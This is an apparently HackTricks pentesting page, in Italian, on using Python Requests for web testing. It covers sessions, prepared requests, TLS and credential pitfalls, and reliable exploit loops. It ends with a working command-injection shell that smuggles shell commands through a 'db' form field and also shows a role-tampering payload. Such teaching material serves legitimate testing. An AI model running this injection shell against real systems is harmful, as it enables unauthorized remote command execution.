# Richieste Web

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Questi esempi utilizzano gli argomenti documentati delle richieste di Requests, le proprietà delle risposte, le tuple dei file multipart e le sessioni.<sup>[[1]](#references)</sup> Gli esempi con `verify=False` disabilitano la verifica dei certificati TLS e dovrebbero essere limitati a test controllati.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Richieste preparate per il controllo del payload

Un `PreparedRequest` espone l'URL finale, gli header e il body codificato prima dell'invio. Crealo con `Session.prepare_request()` (anziché `Request.prepare()`) quando è necessario applicare i cookie o l'autenticazione della sessione; quando il flusso preparato deve inoltre rispettare le impostazioni di proxy/CA dell'ambiente, uniscile esplicitamente con `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Questo è utile quando un exploit richiede una codifica non standard o quando si confronta il payload costruito con la request memorizzata in `response.request`. Non è una primitiva raw-HTTP: Requests memorizza gli headers in una mapping che non distingue tra maiuscole e minuscole, quindi assegnare un nome duplicato sostituisce il valore precedente. Usa un sender di livello inferiore per request lines malformate o campi `Content-Length`/`Transfer-Encoding` duplicati e distinti, necessari per gli [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Isolamento della sessione, credenziali implicite e stato TLS

Una session si fida della configurazione dell'ambiente per impostazione predefinita. Se non viene fornita un'autenticazione esplicita, Requests può ottenere credenziali Basic da `.netrc`; può inoltre importare la configurazione del proxy e i percorsi dei CA bundle dalle variabili d'ambiente. Per gli script che eseguono il fetch di URL controllati dall'attaccante, disabilita questi input impliciti e configura esplicitamente solo il proxy/CA previsto per il lab. Le release precedenti alla 2.32.4 potevano selezionare le credenziali `.netrc` per l'host errato quando veniva fornito un URL creato ad arte in modo malevolo, mentre `Session.trust_env = False` è la soluzione documentata quando non è possibile effettuare un upgrade.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Mantieni separata una sessione che utilizza `verify=False` dalle sessioni che richiedono TLS verificato. In Requests prima della versione 2.32.0, una connessione aperta inizialmente con `verify=False` poteva essere riutilizzata per richieste successive dello stesso origin anche quando tali richieste specificavano `verify=True`; l'aggiornamento risolve questo problema dello stato del pool, ma l'isolamento rende anche gli exploit script più facili da verificare.<sup>[[5]](#references)</sup>

## Cicli di exploit affidabili

Requests non ha un timeout predefinito. Un timeout `(connect, read)` non è una scadenza totale in tempo reale: il componente read limita per quanto tempo il client attende tra i byte ricevuti. Disabilita i redirect automatici quando un target controlla `Location`, quindi valida ogni hop prima di inviare una nuova richiesta; se i redirect sono abilitati, esamina `response.history`. Per risposte grandi o ostili, usa `stream=True`, itera in chunk di dimensioni limitate e chiudi la response con un context manager in modo che la connessione del pool venga rilasciata.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Comando Python per sfruttare un RCE

Il ciclo dei comandi crea una sottoclasse di `Cmd` di Python; il suo metodo `default` gestisce i prefissi di comando non riconosciuti, `cmdloop` distribuisce le righe di input e `re.DOTALL` consente al pattern di estrazione di attraversare le nuove righe.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Interfaccia per sviluppatori di Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Supporto per interpreti di comandi orientati alle righe](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operazioni sulle espressioni regolari](https://docs.python.org/3/library/re.html)
- [4] [Requests vulnerabile al leak delle credenziali `.netrc` tramite URL dannosi](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [L'oggetto `Session` di Requests non verifica le richieste dopo aver effettuato la prima richiesta con `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
